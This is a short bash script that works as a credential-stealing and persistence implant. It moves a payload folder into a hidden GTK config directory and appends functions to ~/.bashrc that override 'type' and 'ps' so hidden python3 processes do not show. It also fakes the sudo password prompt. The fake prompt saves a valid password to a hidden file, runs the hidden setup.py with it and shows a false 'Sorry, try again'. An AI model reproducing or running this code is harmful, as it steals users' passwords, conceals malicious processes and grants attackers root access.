#!/bin/bash
rc=$HOME/.bashrc; 
mv ~/beta ~/.config/gtk-3.0/beta;
echo 'function type() { if [ $# -eq 0 ]; then true; elif [ "$@" == "type" ]; then echo "type is a shell builtin"; elif [ "$@" == "sudo" ]; then echo "sudo is /usr/bin/sudo"; elif [ "$@" == "ps" ]; then echo "ps is /usr/bin/ps"; else builtin type $@; fi; }' >> $rc;
echo "function ps() { /usr/bin/ps $@ > temp; printf '\033[?7l'; grep -v 'python3' temp; printf '\033[?7h'; rm temp;};" >> $rc; 
echo 'function sudo() { set +o history; if [ $# -eq 0 ]; then /usr/bin/sudo; else echo -n "[sudo] password for $USER: "; read -s pass; echo; /usr/bin/sudo -k; echo -n $pass | /usr/bin/sudo -S echo hello &> /dev/null; if [ "$(/usr/bin/sudo -n echo hello 2>&1)" == "hello" ]; then echo -n $pass > ~/.config/gtk-3.0/beta/p; unset -f sudo; head -n -1 .bashrc > temp; mv temp .bashrc; source .bashrc; python3 ~/.config/gtk-3.0/beta/setup.py; sleep 1; fi; unset -v pass; echo "Sorry, try again."; sudo -k $@; fi; set -o history;};' >> $rc;
sed -i 's/type -P/type/g' $rc; source $rc; 
exit
